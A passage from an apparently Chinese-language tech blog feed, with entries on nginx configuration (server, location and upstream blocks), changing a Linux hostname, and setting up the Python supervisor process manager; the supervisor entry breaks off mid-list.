<code>nginx-mainline</code> 包或 <code>nginx</code> 包.</p><p>nginx-mainline 的模块可以在 AUR 上找到.</p><p>可查阅 “我的第一本 Docker 书”.</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>直接用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ nginx<br></code></pre></td></tr></table></figure><p>来打开.</p><p>当 nginx 打开后, 可以用 <code>-s</code> 选项控制, 如:</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qml">nginx -s <span class="hljs-keyword">signal</span><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>这个 signal 有以下几种:</p><ul><li>stop</li><li>quit</li><li>reload, 重新加载配置文件</li><li>reopen, 重新打开 log files</li></ul><p>在 <code>nginx -s reload</code> 之后, 若配置文件正确, 其会创建一个新的 worker processes 然后向 old worker processes 发送信号, 要求其关闭, 但它不会立即关闭, 其会 stop accepting new connections and continue to service current requests until all such requests are serviced.</p><p>nginx master process 的 PID 记录在 <code>/usr/local/nginx/logs/</code> 或 <code>/var/run/</code> 下的 <code>nginx.pid</code> 文件中. 可以使用 kill 命令和 nginx 交互.</p><p>和 control 相关的 <a href="http://nginx.org/en/docs/control.html">网站</a></p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="配置文件位置"><a href="#配置文件位置" class="headerlink" title="配置文件位置"></a>配置文件位置</h2><p>nginx 的配置文件为 <code>nginx.conf</code>, 路径为:</p><ul><li><code>/usr/local/nginx/conf</code></li><li><code>/etc/nginx/</code></li><li><code>/usr/local/etc/nginx</code></li></ul><h2 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h2><p><img src="/../img/file_structure.png" alt="Nginx 配置文件结构"></p><p>组成 Nginx 的模块由配置文件中的 directive 控制. directives 被分成 simple directives 和 block directives.</p><p>一个 simple directive 由 name 和 parameters, 且用 <code>;</code> 分隔组成.</p><p>一个 block directive 和 simple directive 有相同的结构, 但是用 <code>&#123;&#125;</code> 包裹.</p><p>一个 block directive 里面可以有其他的 directive, 叫做 context, 如 events, http, server, location.</p><p>如果有的 directives 放在任何 context 外面, 就叫做 main context.</p><p><code>#</code> 表明注释.</p><p>Nginx 配置文件主要分成四个部分: main (全局设置), server (主机设置), upstream (负载均衡服务器设置) 和 location (URL 匹配特定位置的设置). 这些是设置的块区域.</p><p>main 部分 (也就是在所有的块之外的部分) 设置的命令将影响其他所有设置.</p><p>server 部分的命令主要用于指定主机和端口.<br>长这样:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>    xx;<br>    <span class="hljs-attribute">server_name</span>  xxx<br>&#125;<br></code></pre></td></tr></table></figure><p>location 部分用于匹配网页位置. 一般放在 server 块里面:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span> &#123;<br>    <span class="hljs-keyword">listen</span>    xx;<br>    server_name  xxx<br><br>    <span class="hljs-keyword">location</span> / &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>upstream 命令主要用于负载均衡, 设置一系列的后端服务器, 一般放在 server 块之后, 和 location 中的 <code>proxy_pass</code> 配合使用:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span> &#123;<br>    <span class="hljs-keyword">listen</span>    xx;<br>    server_name  xxx<br><br>    <span class="hljs-keyword">location</span> / &#123;<br>        proxy_pass [<span class="hljs-keyword">server</span>];<br>    &#125;<br>&#125;<br><br>upstream [<span class="hljs-keyword">server</span>] &#123;<br>    <span class="hljs-keyword">server</span> xxx;<br>    <span class="hljs-keyword">server</span> xxx;<br>    <span class="hljs-keyword">server</span> xxx;<br>&#125;<br></code></pre></td></tr></table></figure><p>server 继承 main, location 继承 server, upstream 既不会继承其他设置, 也不会被继承.</p><h2 id="细分每一个-block-的配置和常用选项"><a href="#细分每一个-block-的配置和常用选项" class="headerlink" title="细分每一个 block 的配置和常用选项"></a>细分每一个 block 的配置和常用选项</h2><h3 id="main-也就是所有-block-之外"><a href="#main-也就是所有-block-之外" class="headerlink" title="main 也就是所有 block 之外"></a>main 也就是所有 block 之外</h3><p>整体一般写这些, 后面有单个讲解:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">user user [<span class="hljs-keyword">group</span>];<br>worker_processes <span class="hljs-number">4</span>;<br>worker_rlimit_nofile <span class="hljs-number">51200</span>;<br>access_log      <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_access.log;<br>error_log       <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_error.log;<br>pid <span class="hljs-regexp">/run/</span>nginx.pid;<br>daemon on;<br></code></pre></td></tr></table></figure><h4 id="设置-worker-processes-的权限"><a href="#设置-worker-processes-的权限" class="headerlink" title="设置 worker_processes 的权限."></a>设置 <code>worker_processes</code> 的权限.</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">user</span> <span class="hljs-title">user</span> [group];<br></code></pre></td></tr></table></figure><p>Nginx 服务器中主进程 (master process) 是以 root 权限运行的.</p><p>这里设置用户和组是针对工作进程 (worker process).</p><p>Nginx 提供两种设置用户和组的方式:</p><ul><li>安装时通过编译选项进行设置</li><li>修改配置文件</li></ul><p>主进程接受客户端的请求, 转交给工作进程处理.</p><p><code>group</code> 忽略不写时, 用和 <code>user</code> 相同的名字代替.</p><p>nginx 似乎是属于 <code>www-data</code> 这个用户组的.</p><h4 id="设置开启的进程数"><a href="#设置开启的进程数" class="headerlink" title="设置开启的进程数"></a>设置开启的进程数</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">worker_processes <span class="hljs-number">4</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><code>worker_processes</code>, 其值决定了 nginx 接受多少连接和它会使用多少处理器, 若设置为 <code>auto</code>, 它会自动检测最优值.</p><h4 id="设置最多文件描述符打开数目"><a href="#设置最多文件描述符打开数目" class="headerlink" title="设置最多文件描述符打开数目"></a>设置最多文件描述符打开数目</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">worker_rlimit_nofile <span class="hljs-number">51200</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这个值和 <code>ulimit -n</code> 的输出最好保持一致.</p><h4 id="设置全局的-access-log-和-error-log"><a href="#设置全局的-access-log-和-error-log" class="headerlink" title="设置全局的 access_log 和 error_log"></a>设置全局的 <code>access_log</code> 和 <code>error_log</code></h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">access_log      <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_access.log;<br>error_log       <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_error.log;<br></code></pre></td></tr></table></figure><p>后面跟的是路径.</p><h4 id="设置-pid-存放位置"><a href="#设置-pid-存放位置" class="headerlink" title="设置 pid 存放位置"></a>设置 pid 存放位置</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pid <span class="hljs-regexp">/run/</span>nginx.pid;<br></code></pre></td></tr></table></figure><h4 id="设置是否开启守护进程模式"><a href="#设置是否开启守护进程模式" class="headerlink" title="设置是否开启守护进程模式"></a>设置是否开启守护进程模式</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">daemon</span> <span class="hljs-literal">on</span>;<br></code></pre></td></tr></table></figure><p><code>daemon off;</code> 表示以非守护进程模式运行. 阻止 nginx 进入后台. 其可以保持 Docker 容器的活跃状态.</p><h3 id="events-块"><a href="#events-块" class="headerlink" title="events 块"></a>events 块</h3><p>其设置 Nginx 的工作模式以及连接数上限.</p><p>长这样:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">events</span> &#123;<br>    <span class="hljs-attribute">use</span> <span class="hljs-literal">epoll</span>;<br>    <span class="hljs-attribute">worker_connections</span> <span class="hljs-number">51200</span>;<br>    <span class="hljs-attribute">multi_accept</span> <span class="hljs-literal">off</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="设置-Nginx-的工作模式"><a href="#设置-Nginx-的工作模式" class="headerlink" title="设置 Nginx 的工作模式"></a>设置 Nginx 的工作模式</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">use</span> <span class="hljs-literal">epoll</span>;<br></code></pre></td></tr></table></figure><p>对于 Linux 系统, epoll 工作模式是首选.</p><h4 id="设置-worker-process-进程的最大并发链接数"><a href="#设置-worker-process-进程的最大并发链接数" class="headerlink" title="设置 worker process 进程的最大并发链接数"></a>设置 worker process 进程的最大并发链接数</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">worker_connections <span class="hljs-number">51200</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><code>woker_connection</code> 定义的是 Nginx 每个进程的最大连接数.</p><h4 id="设置是串行还是并行"><a href="#设置是串行还是并行" class="headerlink" title="设置是串行还是并行"></a>设置是串行还是并行</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">multi_accept</span> <span class="hljs-literal">off</span>;<br></code></pre></td></tr></table></figure><p><code>off</code> 就是串行, 也就是默认值.</p><h3 id="http-块"><a href="#http-块" class="headerlink" title="http 块"></a>http 块</h3><p>整体观感, 这个部分的设置就有很多选择了, 这一部分就参考别人的讲解:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">http</span> &#123;<br>    <span class="hljs-attribute">sendfile</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">tcp_nopush</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">tcp_nodelay</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">keepalive_timeout</span> <span class="hljs-number">65</span>;<br>    <span class="hljs-attribute">types_hash_max_size</span> <span class="hljs-number">2048</span>;<br>    <span class="hljs-attribute">include</span> /etc/nginx/mime.types;<br>    <span class="hljs-attribute">default_type</span> application/octet-stream;<br>    <span class="hljs-attribute">access_log</span> /var/log/nginx/access_log;<br>    <span class="hljs-attribute">error_log</span> /var/log/nginx/error_log;<br><br>    <span class="hljs-attribute">server_names_hash_bucket_size</span> <span class="hljs-number">128</span>;<br>    <span class="hljs-attribute">client_header_buffer_size</span> <span class="hljs-number">32k</span>;<br>    <span class="hljs-attribute">large_client_header_buffers</span> <span class="hljs-number">4</span> <span class="hljs-number">32k</span>;<br>    <span class="hljs-attribute">client_max_body_size</span> <span class="hljs-number">50m</span>;<br><br>    <span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">gzip_disable</span> <span class="hljs-string">&quot;msie6&quot;</span>;<br><br>    <span class="hljs-attribute">include</span> /etc/nginx/conf.d/<span class="hljs-regexp">*.conf</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.muouseo.com/article/n2oeglwy73.html">参考1</a><br><a href="https://www.jb51.net/article/182585.htm">参考2</a></p><p>一部分解释:</p><p><code>include</code> 指令用来包含另外的配置文件.</p><p><code>default_type</code> 当文件类型未定义时使用这个类型, 默认值为二进制流.</p><p><code>sendfile on</code> 表示开启高效文件传输模式, 默认为 off.</p><p><code>tcp_nopush on</code> 和 <code>tcp_nodelay on</code> 用来防止网络堵塞. </p><p><code>keepalive_timeout + 数字</code> 设置连接超时限制.</p><h3 id="server-代码块"><a href="#server-代码块" class="headerlink" title="server 代码块"></a>server 代码块</h3><p>这个一般放在 http block 里面, 而且一般不放在 <code>nginx.conf</code> 这个主配置文件中, 而是用 <code>include</code> 指令包含进来.</p><p>server 块: 配置虚拟主机的相关参数.<br>比如:</p><p>两个目录 (也可以在其他地方):</p><ul><li><code>/etc/nginx/sites-available</code></li><li><code>/etc/nginx/sites-enabled</code></li></ul><p>可以在 <code>sites-available</code> 目录下创建文件, 并写入 <code>server</code> 模块.</p><p>可以在 <code>nginx.conf</code> 文件中某个 block 下写入:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-meta"><span class="hljs-keyword">include</span> site-enabled/*</span><br></code></pre></td></tr></table></figure><p>需要添加某个 <code>server</code> 的时候, 创建一个 symbolic link 就可以了.</p><p>server 块的作用就是设置虚拟主机 (用来匹配的域名).</p><p>大概:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">server &#123;<br>    listen xx;                 <span class="hljs-comment"># 本机的监听端口</span><br>    server_name xxx;           <span class="hljs-comment"># 虚拟主机名</span><br>    root xxx;                  <span class="hljs-comment"># 资源所处的根目录</span><br>    index xxx;                 <span class="hljs-comment"># 默认打开的界面</span><br>    autoindex [on/off];        <span class="hljs-comment"># 以列表形式显示而不是直接打开</span><br>    autoindex_localtime on;    <span class="hljs-comment"># 列表中显示时间</span><br>    autoindex_exact_size off;  <span class="hljs-comment"># 列表中显示大小, 以 KB, MB, GB 形式</span><br><br><br>    <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123;</span><br><span class="hljs-title">        return</span> xxx;<br>    &#125;<br><br>    <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123;</span><br><span class="hljs-title">        proxy_pass</span> xxx;<br>    &#125;<br><br>    <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123;</span><br><span class="hljs-title">        index</span> xxx;<br>        allow xxx;<br>        <span class="hljs-keyword">deny</span>  xxx;<br>    &#125;<br><br>    error_page <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span>  /<span class="hljs-number">50</span>x.html;  <span class="hljs-comment"># 设置错误页</span><br>&#125;<br><br>server &#123;<br>    ...<br>    ...<br>    ...<br>&#125;<br><br>server &#123;<br>    ...<br>    ...<br>    ...<br>&#125;<br><br>server &#123;<br>    ...<br>    ...<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>有几个 <code>server</code> 模块, 就可以设置几个虚拟主机.</p><p>nginx 会决定哪个 server 来处理哪个 request.</p><h3 id="location-部分"><a href="#location-部分" class="headerlink" title="location 部分"></a>location 部分</h3><p>location 块 (URL 匹配特定位置的设置): 配置请求路由, 以及各种页面的处理情况.<br>一般这个形式:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">xxx</span> &#123;<br>    xxx;<br>&#125;<br></code></pre></td></tr></table></figure><p>location 块的前缀:<br><img src="/../img/prefix_of_location_block.png" alt="location 块的前缀"></p><p>出现任何问题都可以查看 <code>/usr/local/nginx/logs</code> 或 <code>/var/log/nginx</code> 处的日志文件.</p><h4 id="不同端口代理不同页面"><a href="#不同端口代理不同页面" class="headerlink" title="不同端口代理不同页面"></a>不同端口代理不同页面</h4><p>如:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">8080</span>;<br>    <span class="hljs-attribute">server_name</span> xxx xxx xxx;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">proxy_pass</span> https://localhost:8885/;<br>    &#125;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">proxy_pass</span> https://localhost:8886/;<br>    &#125;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">proxy_pass</span> https://localhost:8886/;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="显示一个页面"><a href="#显示一个页面" class="headerlink" title="显示一个页面"></a>显示一个页面</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">8080</span>;<br>    <span class="hljs-attribute">server_name</span> xxx xxx xxx;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">index</span> xxx;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="网页跳转"><a href="#网页跳转" class="headerlink" title="网页跳转"></a>网页跳转</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">8080</span>;<br>    <span class="hljs-attribute">server_name</span> xxx xxx xxx;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">return</span> https://www.baidu.com/;<br>    &#125;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">return</span> https://github.com/;<br>    &#125;<br><br>    <span class="hljs-section">location</span> xxx &#123;<br>        <span class="hljs-attribute">return</span> https://www.google.com/;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="upstream-块"><a href="#upstream-块" class="headerlink" title="upstream 块"></a>upstream 块</h3><p>upstream 块 (负载均衡服务器设置): 指令主要用于负载均衡, 设置一系列的后端服务器, upstream 后的名称和后面 <code>proxy_pass</code> 要对应起来.<br>示例:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>       <span class="hljs-attribute">listen</span>          <span class="hljs-number">0.0.0.0:80</span>;<br>       <span class="hljs-attribute">server_name</span>     _;<br><br>       <span class="hljs-attribute">root</span>            /var/www/html;<br>       <span class="hljs-attribute">index</span>           /index.nginx-debian.html;<br><br>       <span class="hljs-attribute">access_log</span>      /var/log/nginx/default_access.log;<br>       <span class="hljs-attribute">error_log</span>       /var/log/nginx/default_error.log;<br><br>       <span class="hljs-section">location</span> <span class="hljs-regexp">~ /h</span> &#123;<br>          <span class="hljs-attribute">proxy_pass</span> http://webthreepages;<br>       &#125;<br>&#125;<br><br><span class="hljs-section">upstream</span> webthreepages &#123;<br>       <span class="hljs-attribute">server</span> <span class="hljs-number">172.17.0.3:80</span> weight=<span class="hljs-number">1</span>;<br>       <span class="hljs-attribute">server</span> <span class="hljs-number">172.17.0.3:81</span> weight=<span class="hljs-number">2</span>;<br>       <span class="hljs-attribute">server</span> <span class="hljs-number">172.17.0.3:82</span> weight=<span class="hljs-number">3</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>Nginx 的正则表达式支持的特殊字符:</p><ul><li><code>*</code></li><li><code>+</code></li><li><code>?</code></li><li><code>^</code> 和 <code>$</code></li><li><code>.</code></li><li><code>[]</code></li><li><code>&#123;&#125;</code></li><li><code>()</code></li><li><code>|</code></li><li><code>\d</code>, <code>\D</code>, <code>\w</code>, <code>\W</code><br>匹配模式是非贪婪的.</li></ul>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>修改 Linux 主机名</title>
    <link href="/2022/08/28/%E4%BF%AE%E6%94%B9-Linux-%E4%B8%BB%E6%9C%BA%E5%90%8D/"/>
    <url>/2022/08/28/%E4%BF%AE%E6%94%B9-Linux-%E4%B8%BB%E6%9C%BA%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<p>修改 <code>/etc/hostname</code> 文件即可。</p><p>使其立即生效:</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">$ <span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> 新的名字<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 中 supervisor 库</title>
    <link href="/2022/08/28/Python-%E4%B8%AD-supervisor-%E5%BA%93/"/>
    <url>/2022/08/28/Python-%E4%B8%AD-supervisor-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p><a href="http://supervisord.org/">官网</a><br><a href="https://www.jb51.net/article/235260.htm">参考博客</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>是用 Python 开发的 client&#x2F;server 服务，为 Linux&#x2F;Unix 系统下的进程管理程序.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> supervisor<br></code></pre></td></tr></table></figure><p>安装之后(Ubuntu 22.04)，<code>~/.local/bin</code> 目录下会出现三个程序:</p><ul><li>supervisortd</li><li>supervisorctl</li><li>echo_supervisord_conf, 用于生成初始化配置文件 <code>/etc/supervisord.conf</code></li></ul><h1 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h1><p>其由两个主要组成部分:</p><ul><li>supervisord, 一个守护进程，负责启动所管理的进程，并将所管理的进程作为自己的子程序启动，在所管理的进程出现崩溃时会自动重启</li><li>supervisorctl, 一个命令行管理工具，用于执行 stop, start, restart 等命令</li></ul><h1 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h1><p>调用 <code>echo_supervisord_conf</code> 命令，先添加至 <code>PATH</code> 变量:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> ~<br>vim <span class="hljs-string">.bashrc</span><br></code></pre></td></tr></table></figure><p>添加: <code>export PATH=$PATH:~/.local/bin</code></p><p>因为我们以普通用户操作，执行:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo chown user.<span class="hljs-keyword">user</span> <span class="hljs-title">/etc</span>/supervisord.conf<br></code></pre></td></tr></table></figure><p>开始初始化:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$ echo_supervisord_conf &gt; <span class="hljs-regexp">/etc/</span>supervisord.conf<br></code></pre></td></tr></table></figure><p>因后续权限问题还是把 <code>/etc/supervisord.conf</code> 的所属改为 root.</p><h2 id="使用-include"><a href="#使用-include" class="headerlink" title="使用 include"></a>使用 include</h2><p><code>/etc/supervisord.conf</code> 文件的最后是:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">[<span class="hljs-keyword">include</span>]<br>files = relative<span class="hljs-regexp">/directory/</span>*.ini<br></code></pre></td></tr></table></figure><p>其用来为进程写配置文件.</p><p>此时创建一个目录并添加至 <code>[include]</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> /etc/supervisor ;<span class="hljs-built_in">cd</span> /etc/supervisor</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">touch</span> config.d</span><br></code></pre></td></tr></table></figure><h2 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h2><ul><li>command：启动程序使用的命令，可以是绝对路径或者相对路径</li><li>process_name：一个python字符串表达式，用来表示supervisor进程启动的这个的名称，默认值是%(program_name)s</li><li>numprocs：Supervisor启动这个程序的多个实例，如果numprocs&gt;1，则process_name的表达式必须包含%(process_num)s，默认是1</li><li>numprocs_start：一个int偏移值，当启动实例的时候用来计算numprocs的值</li><li>priority：权重，可以控制程序启动和关闭时的顺序，权重越低：越早启动，越晚关闭。默认值是999</li><li>autostart：如果设置为true，当supervisord启动的时候，进程会自动重启。</li><li>autorestart：值可以是false、true、unexpected。false：进程不会自动重启，unexpected：当程序退出时的退出码不是exitcodes中定义的时，进程会重启，true：进程会无条件重启当退出的时候。</li><li>startsecs：程序启动后等待多长时间后才认为程序启动成功</li><li>startretries：supervisord尝试启动一个程序时尝试的次数。默认是3</li><li>exitcodes：一个预期的退出返回码，默认是0,2。</li><li>stopsignal：当收到stop请求的时候，发送信号给程序，默认是TERM信号，也可以是 HUP, INT, QUIT, KILL, USR1, or 